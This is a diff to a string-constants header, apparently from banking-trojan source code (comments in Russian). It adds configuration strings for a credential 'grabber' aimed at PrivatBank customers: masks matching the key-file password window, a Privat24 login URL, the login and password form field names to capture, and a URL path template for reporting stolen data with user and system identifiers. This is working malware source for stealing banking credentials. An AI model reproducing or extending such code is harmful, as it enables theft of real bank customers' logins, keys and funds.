@@ -174,6 +174,8 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 // Строки модуля AzConfig
 #ifdef AzConfigH
 	CSSTR AzConfigParamUserName[] = "%az_user%";
+
+	CSSTR EStrAzGrabberPathMask[] = "/raf/?uid=%s&sys=%s&cid=%s&mode=%s";
 #endif
 
 
@@ -203,9 +205,21 @@ CSSTR IFobsFlagCopy[] = "ifobscopy.txt";
 #endif
 
 
-#ifdef PrivatBankKeyPassH
+#ifdef PrivatBankH
 	// Имя системы грабера пароля ключа приватбанка
-	CSSTR EStrPrivatBankKeyPasswordGrabber[] = "privatkeypass";
+	CSSTR EStrPrivatBankGrabber[] = "privatbank";
+
+	// Маска зпголовка окна ввода проля
+	CSSTR EStrPrivatBankKeyPassWndMask[] = "Файл ключей*";
+	CSSTR EStrPrivatBankKeyPassWndMask2[] = "Ключ*";
+
+	// Маска определения адреса авторизации в приват24
+	CSSTR EStrPrivatBankLoginMask[] = "https://cb.privatbank.ua/p24/news*";
+
+	// логин и пароль приватбанка
+	CSSTR EStrPrivatBankLogin[]    = "UserName";
+	CSSTR EStrPrivatBankPassword[] = "UserPass";
+
 #endif
 
 
